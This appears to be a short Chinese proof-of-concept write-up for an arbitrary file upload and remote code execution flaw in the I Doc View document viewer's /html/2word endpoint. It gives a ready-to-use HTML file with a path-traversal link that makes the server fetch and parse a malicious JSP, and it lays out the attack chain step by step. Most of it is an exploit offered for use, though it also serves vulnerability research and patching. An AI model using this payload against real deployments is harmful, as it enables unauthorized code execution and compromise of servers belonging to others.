
## I Doc View任意文件上传漏洞
I DOC VIEW是一个在线的文档查看器，其中的/html/2word接口因为处理不当，导致可以远程读取任意文件，通过这个接口导致服务器下载恶意的JSP进行解析，从而RCE。

## POC构造
流程：携带恶意link[href]的html -> 远程获取  -> 解析出href -> 远程获取恶意文件

poc.html
```html

<!DOCTYPE html>
<html lang="en">
<head>
    <title>test</title>  
</head>
<body>
  <link href="/..\..\..\docview\poc.jsp">
</body>
</html>
```
然后构造 `..\..\..\docview\poc.jsp`  这个是文件
![image](https://github.com/wy876/POC/assets/139549762/736f7c0a-4f06-4170-805a-cf1580b69de3)

![image](https://github.com/wy876/POC/assets/139549762/73ab1c2a-ad91-40a3-96b0-0ca978fa9abe)

## 漏洞分析
```
https://mp.weixin.qq.com/s/lDqhDnZGXoRyp2IolQ2odg
https://mp.weixin.qq.com/s/mD4EcVmJ9QPmmMLh6KrZ0g
```
